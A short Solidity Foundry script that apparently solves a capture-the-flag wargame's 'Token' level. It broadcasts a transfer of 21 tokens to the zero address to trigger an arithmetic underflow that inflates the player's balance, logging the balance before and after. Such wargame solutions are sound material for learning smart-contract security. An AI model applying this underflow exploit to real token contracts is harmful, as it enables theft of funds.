// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
}

contract TokenSolution is Script {

    IToken public tokenInstance = IToken(0xC2D4576Ad8b9D1a7f5c353037286bEF02af3686C);

    function run() public {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address player = vm.envAddress("MY_ADDRESS");

        console.log("Balance Before:", tokenInstance.balanceOf(player));

        tokenInstance.transfer(address(0), 21);

        console.log("Balance After:", tokenInstance.balanceOf(player));

        vm.stopBroadcast();
    }
}